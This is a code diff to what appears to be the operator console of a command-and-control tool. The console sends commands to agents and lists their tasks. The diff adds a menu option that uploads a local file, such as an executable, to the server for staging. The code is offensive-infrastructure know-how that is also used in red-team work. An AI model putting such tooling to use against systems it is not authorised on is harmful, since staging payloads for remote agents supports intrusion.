@@ -108,6 +108,29 @@ def send_command():
     except Exception as e:
         print(f"[!] Failed to send command: {e}")
 
+def stage_file():
+    local_path = input("Enter local file path: ").strip()
+    filename   = input("Enter filename to store on server (ex: tool.exe): ").strip()
+
+    try:
+        with open(local_path, "rb") as f:
+            file_data = base64.b64encode(f.read()).decode()
+
+        r = requests.post(
+            f"{SERVER_URL}/stage_file",
+            json={"filename": filename, "file_data": file_data},
+            timeout=15
+        )
+        r.raise_for_status()
+        resp = r.json()
+
+        print(GREEN + f"[+] File {local_path} staged as {resp['filename']}" + RESET)
+        print(f"Stored at: {resp['path']}")
+
+    except Exception as e:
+        print(RED + f"[!] Failed to stage file: {e}" + RESET)
+
+
 def main():
     while True:
         print(GREEN+"\n---------------------------------")
@@ -118,7 +141,8 @@ def main():
         print("3. Send command to agent")
         print("4. List queued tasks")
         print("5. List completed tasks")
-        print("6. Exit" + RESET)
+        print("6. Stage a file on server")
+        print("7. Exit" + RESET)
 
         choice = input("Select an option: ").strip()
         print("\n")
@@ -134,6 +158,8 @@ def main():
         elif choice == "5":
             list_tasks("Completed")
         elif choice == "6":
+            stage_file()
+        elif choice == "7":
             print("Exiting...")
             sys.exit(0)
         else:
